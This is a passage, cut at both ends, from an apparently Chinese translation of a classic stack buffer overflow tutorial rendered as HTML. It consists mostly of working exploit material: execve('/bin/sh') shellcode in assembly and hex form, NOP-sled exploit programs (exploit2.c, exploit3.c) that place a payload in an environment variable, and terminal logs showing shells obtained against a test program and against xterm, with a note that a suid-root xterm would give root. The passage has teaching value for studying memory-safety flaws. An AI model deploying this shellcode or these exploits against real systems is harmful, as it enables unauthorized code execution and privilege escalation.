$0xb,%al<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %ebx,%ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebx,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------------------------------------------------------<BR><BR>&nbsp;&nbsp; Our improved code:<BR><BR>shellcodeasm2.c<BR>------------------------------------------------------------------------------<BR>void main() {<BR>__asm__("<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x1f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 byte<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %eax,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; %eax,0x7(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %eax,0xc(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0xb,%al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %ebx,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebx,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; -0x24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .string \"/bin/sh\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 8 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 46 bytes total<BR>");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp; And our new test program:<BR><BR>testsc2.c<BR>------------------------------------------------------------------------------<BR>char shellcode[] =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>void main() {<BR>&nbsp;&nbsp; int *ret;<BR><BR>&nbsp;&nbsp; ret = (int *)&amp;ret + 2;<BR>&nbsp;&nbsp; (*ret) = (int)shellcode;<BR><BR>}<BR>------------------------------------------------------------------------------<BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o testsc2 testsc2.c<BR>[aleph1]$ ./testsc2<BR>$ exit<BR>[aleph1]$<BR>------------------------------------------------------------------------------<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 破解实战&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 现在把手头的工具都准备好. 我们已经有了shellcode. 我们知道shellcode必须是被<BR>溢出的字符串的一部分. 我们知道必须把返回地址指回缓冲区. 下面的例子说明了这几点:<BR><BR><BR>overflow1.c<BR>------------------------------------------------------------------------------<BR>char shellcode[] =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>char large_string[128];<BR><BR>void main() {<BR>&nbsp; char buffer[96];<BR>&nbsp; int i;<BR>&nbsp; long *long_ptr = (long *) large_string;<BR><BR>&nbsp; for (i = 0; i &lt; 32; i++)<BR>&nbsp;&nbsp;&nbsp; *(long_ptr + i) = (int) buffer;<BR><BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; large_string[i] = shellcode[i];<BR><BR>&nbsp; strcpy(buffer,large_string);<BR>}<BR>------------------------------------------------------------------------------<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o exploit1 exploit1.c<BR>[aleph1]$ ./exploit1<BR>$ exit<BR>exit<BR>[aleph1]$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 如上所示, 我们用buffer[]的地址来填充large_string[]数组, shellcode就将会在<BR>buffer[]之中. 然后我们把shellcode复制到large_string字串的开头. strcpy()不做任<BR>何边界检查就会将large_string复制到buffer中去, 并且覆盖返回地址. 现在的返回地址<BR>就是我们shellcode的起始位置. 一旦执行到main函数的尾部, 在试图返回时就会跳到我<BR>们的shellcode中, 得到一个shell.<BR><BR>&nbsp;&nbsp;&nbsp; 我们所面临的问题是: 当试图使另外一个程序的缓冲区溢出的时候, 如何确定这个<BR>缓冲区(会有我们的shellcode)的地址在哪? 答案是: 对于每一个程序, 堆栈的起始地址<BR>都是相同的. 大多数程序不会一次向堆栈中压入成百上千字节的数据. 因此知道了堆栈<BR>的开始地址, 我们可以试着猜出这个要使其溢出的缓冲区在哪. 下面的小程序会打印出<BR>它的堆栈指针: <BR><BR><BR>sp.c<BR>------------------------------------------------------------------------------<BR>unsigned long get_sp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR>void main() {<BR>&nbsp; printf("0x%x\n", get_sp());<BR>}<BR>------------------------------------------------------------------------------<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ ./sp<BR>0x8000470<BR>[aleph1]$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 假定我们要使其溢出的程序如下:<BR>&nbsp;&nbsp;&nbsp; <BR>vulnerable.c<BR>------------------------------------------------------------------------------<BR>void main(int argc, char *argv[]) {<BR>&nbsp; char buffer[512];<BR><BR>&nbsp; if (argc &gt; 1)<BR>&nbsp;&nbsp;&nbsp; strcpy(buffer,argv[1]);<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 我们创建一个程序可以接受两个参数, 一是缓冲区大小, 二是从其自身堆栈指针算起<BR>的偏移量(这个堆栈指针指明了我们想要使其溢出的缓冲区所在的位置). 我们把溢出字符<BR>串放到一个环境变量中, 这样就容易操作一些. <BR><BR>exploit2.c<BR>------------------------------------------------------------------------------<BR>#include &lt;stdlib.h&gt;<BR><BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<BR>#define DEFAULT_BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 512<BR><BR>char shellcode[] =<BR>&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR><BR>void main(int argc, char *argv[]) {<BR>&nbsp; char *buff, *ptr;<BR>&nbsp; long *addr_ptr, addr;<BR>&nbsp; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<BR>&nbsp; int i;<BR><BR>&nbsp; if (argc &gt; 1) bsize&nbsp; = atoi(argv[1]);<BR>&nbsp; if (argc &gt; 2) offset = atoi(argv[2]);<BR><BR>&nbsp; if (!(buff = malloc(bsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; addr = get_sp() - offset;<BR>&nbsp; printf("Using address: 0x%x\n", addr);<BR><BR>&nbsp; ptr = buff;<BR>&nbsp; addr_ptr = (long *) ptr;<BR>&nbsp; for (i = 0; i &lt; bsize; i+=4)<BR>&nbsp;&nbsp;&nbsp; *(addr_ptr++) = addr;<BR><BR>&nbsp; ptr += 4;<BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = shellcode[i];<BR><BR>&nbsp; buff[bsize - 1] = '\0';<BR><BR>&nbsp; memcpy(buff,"EGG=",4);<BR>&nbsp; putenv(buff);<BR>&nbsp; system("/bin/bash");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 现在我们尝试猜测缓冲区的大小和偏移量:<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ ./exploit2 500<BR>Using address: 0xbffffdb4<BR>[aleph1]$ ./vulnerable $EGG<BR>[aleph1]$ exit<BR>[aleph1]$ ./exploit2 600<BR>Using address: 0xbffffdb4<BR>[aleph1]$ ./vulnerable $EGG<BR>Illegal instruction<BR>[aleph1]$ exit<BR>[aleph1]$ ./exploit2 600 100<BR>Using address: 0xbffffd4c<BR>[aleph1]$ ./vulnerable $EGG<BR>Segmentation fault<BR>[aleph1]$ exit<BR>[aleph1]$ ./exploit2 600 200<BR>Using address: 0xbffffce8<BR>[aleph1]$ ./vulnerable $EGG<BR>Segmentation fault<BR>[aleph1]$ exit<BR>.<BR>.<BR>.<BR>[aleph1]$ ./exploit2 600 1564<BR>Using address: 0xbffff794<BR>[aleph1]$ ./vulnerable $EGG<BR>$<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 正如我们所看到的, 这并不是一个很有效率的过程. 即使知道了堆栈的起始地址, 尝<BR>试猜测偏移量也几乎是不可能的. 我们很可能要试验几百次, 没准几千次也说不定. 问题<BR>的关键在于我们必须*确切*地知道我们代码开始的地址. 如果偏差哪怕只有一个字节我们<BR>也只能得到段错误或非法指令错误. 提高成功率的一种方法是在我们溢出缓冲区的前段填<BR>充NOP指令. 几乎所有的处理器都有NOP指令执行空操作. 常用于延时目的. 我们利用它来<BR>填充溢出缓冲区的前半段. 然后把shellcode放到中段, 之后是返回地址. 如果我们足够<BR>幸运的话, 返回地址指到NOPs字串的任何位置, NOP指令就会执行, 直到碰到我们的<BR>shellcode. 在Intel体系结构中NOP指令只有一个字节长, 翻译为机器码是0x90. 假定堆栈<BR>的起始地址是0xFF, S代表shellcode, N代表NOP指令, 新的堆栈看起来是这样:<BR><BR><BR>内存低&nbsp;&nbsp;&nbsp;&nbsp; DDDDDDDDEEEEEEEEEEEE&nbsp; EEEE&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp;&nbsp;&nbsp;&nbsp; 内存高<BR>地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 89ABCDEF0123456789AB&nbsp; CDEF&nbsp; 0123&nbsp; 4567&nbsp; 89AB&nbsp; CDEF&nbsp;&nbsp;&nbsp;&nbsp; 地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR><BR>&lt;------&nbsp;&nbsp; [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_____________________|<BR><BR>堆栈顶端&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR><BR>&nbsp;&nbsp;&nbsp; 新的破解程序如下:<BR>&nbsp;&nbsp;&nbsp; <BR>exploit3.c<BR>------------------------------------------------------------------------------<BR>#include &lt;stdlib.h&gt;<BR><BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<BR>#define DEFAULT_BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 512<BR>#define NOP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x90<BR><BR>char shellcode[] =<BR>&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR><BR>void main(int argc, char *argv[]) {<BR>&nbsp; char *buff, *ptr;<BR>&nbsp; long *addr_ptr, addr;<BR>&nbsp; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<BR>&nbsp; int i;<BR><BR>&nbsp; if (argc &gt; 1) bsize&nbsp; = atoi(argv[1]);<BR>&nbsp; if (argc &gt; 2) offset = atoi(argv[2]);<BR><BR>&nbsp; if (!(buff = malloc(bsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; addr = get_sp() - offset;<BR>&nbsp; printf("Using address: 0x%x\n", addr);<BR><BR>&nbsp; ptr = buff;<BR>&nbsp; addr_ptr = (long *) ptr;<BR>&nbsp; for (i = 0; i &lt; bsize; i+=4)<BR>&nbsp;&nbsp;&nbsp; *(addr_ptr++) = addr;<BR><BR>&nbsp; for (i = 0; i &lt; bsize/2; i++)<BR>&nbsp;&nbsp;&nbsp; buff[i] = NOP;<BR><BR>&nbsp; ptr = buff + ((bsize/2) - (strlen(shellcode)/2));<BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = shellcode[i];<BR><BR>&nbsp; buff[bsize - 1] = '\0';<BR><BR>&nbsp; memcpy(buff,"EGG=",4);<BR>&nbsp; putenv(buff);<BR>&nbsp; system("/bin/bash");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 我们所使用的缓冲区大小最好比要使其溢出的缓冲区大100字节左右. 我们在要使其<BR>溢出的缓冲区尾部放置shellcode, 为NOP指令留下足够的空间, 仍然使用我们推测的地址<BR>来覆盖返回地址. 这里我们要使其溢出的缓冲区大小是512字节, 所以我们使用612字节.<BR>现在使用新的破解程序来使我们的测试程序溢出:<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ ./exploit3 612<BR>Using address: 0xbffffdb4<BR>[aleph1]$ ./vulnerable $EGG<BR>$<BR>------------------------------------------------------------------------------<BR> <BR>&nbsp;&nbsp;&nbsp; 哇!一击中的!这个改进成千倍地提高了我们的命中率. 下面在真实的环境中尝试一<BR>下缓冲区溢出. 在Xt库上运用我们所讲述的方法. 在例子中, 我们使用xterm(实际上所有<BR>连接Xt库的程序都有漏洞). 计算机上要运行X Server并且允许本地的连接. 还要相应设<BR>置DISPLAY变量.<BR><BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ export DISPLAY=:0.0<BR>[aleph1]$ ./exploit3 1124<BR>Using address: 0xbffffdb4<BR>[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG<BR>Warning: Color name "隵1?F<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; °<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 骎<BR><BR>?へ@よ?in/shいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい<BR>いいいいいいいいいいいいいいいいいいいいいいいいい¤<BR><BR><BR><BR>(此处截短多行输出)<BR><BR>いいいいいいいいいいい?いいいい<BR>^C<BR>[aleph1]$ exit<BR>[aleph1]$ ./exploit3 2148 100<BR>Using address: 0xbffffd48<BR>[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG<BR>Warning: Color name "隵1?F<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; °<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 骎<BR><BR>?へ@よ?in/sh??????????????????????????????????<BR>?????????????????????????¤<BR><BR><BR><BR>(此处截短多行输出)<BR><BR>縃????????????arning: some arguments in previous message were lost<BR>Illegal instruction<BR>[aleph1]$ exit<BR>.<BR>.<BR>.<BR>[aleph1]$ ./exploit4 2148 600<BR>Using address: 0xbffffb54<BR>[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG<BR>Warning: Color name "隵1?F<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; °<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 骎<BR><BR>?へ@よ?in/sh鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗<BR>鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗?<BR><BR><BR><BR>(此处截短多行输出)<BR><BR>縏鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸚arning: some arguments in previous message were lost<BR>bash$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp; 尤里卡! 仅仅几次尝试我们就成功了!如果xterm是带suid root安装的, 我们就已经<BR>得到了一个root shell了. <BR><BR>&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 小缓冲区的溢出<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 